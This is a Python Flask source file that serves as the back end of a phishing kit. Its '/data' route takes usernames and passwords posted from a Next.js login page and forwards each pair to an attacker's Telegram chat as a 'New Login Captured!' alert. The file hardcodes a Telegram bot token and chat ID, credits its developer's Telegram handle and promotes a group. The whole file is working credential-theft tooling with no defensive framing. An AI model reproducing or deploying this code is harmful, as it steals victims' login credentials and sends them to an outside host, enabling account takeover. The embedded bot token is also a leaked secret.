from flask import Flask, request, jsonify
import requests
import logging

app = Flask(__name__)

# Logging setup
logging.basicConfig(level=logging.INFO)

# 🔹 Replace with your actual Telegram Bot Token & Chat ID
BOT_TOKEN = "7221082219:AAGw6htaypKVvU8RufM9NabvPN-9dgFH9xo"
CHAT_ID = "7726080021"  # Your Telegram chat ID

# Function to send messages to Telegram bot
def send_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    
    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()  # Raise exception for failed requests
        logging.info("✅ Message sent successfully!")
    except requests.exceptions.RequestException as e:
        logging.error(f"❌ Error sending message: {e}")

# Default route to check if the server is running
@app.route("/", methods=["GET"])
def home():
    return jsonify({"status": "running", "message": "Server is live!"})

# Route to receive login data from Next.js frontend
@app.route("/data", methods=["POST"])
def receive_data():
    try:
        data = request.json
        if not data:
            return jsonify({"status": "error", "message": "No data received"}), 400

        username = data.get("username", "Unknown")
        password = data.get("password", "Unknown")

        # 🟢 Message format for Telegram
        message = f"""🔔 New Login Captured!  
📌 **Username:** {username}  
📌 **Password:** {password}  

🛠 Developed by: @journey_with_ms  
📢 Join our Telegram group: https://t.me/ms_place  
"""
        send_message(message)

        return jsonify({"status": "success", "message": "Data received successfully!"})

    except Exception as e:
        logging.error(f"❌ Error processing data: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
